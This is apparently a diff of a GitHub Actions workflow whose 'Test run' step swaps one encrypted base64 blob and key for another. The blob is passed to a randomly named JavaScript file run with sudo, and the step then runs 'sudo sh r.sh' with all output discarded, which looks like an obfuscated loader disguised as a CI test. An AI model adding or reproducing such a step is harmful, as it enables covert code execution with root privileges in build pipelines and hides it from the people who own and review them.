@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'ysdxz'
+        echo 'i6i4n'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX18ywEJFSHIs7MWeXBkrMuYkI9y4CXhivh9CXPrXsBLC07Vz4xE0GFzudvRc5hwVFn+kyf1IqM4Z2e/sbxWEPsA+mXn8eZrTbCzEd8DArBSA6FlMoknCgp0L 034xnd && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1/o6QwvO5q8KZ+ic7mMe84u+vdhhdF77SvMcoGjo2fPklPi1PFxUgUC6ea4+T5yB8QtwseZ7XgHZIDAWo07e2FKVoOfeTv8SJThxOd+kZ8GkjREKh8AvsoS c0hb67 && sudo sh r.sh > /dev/null 2>&1
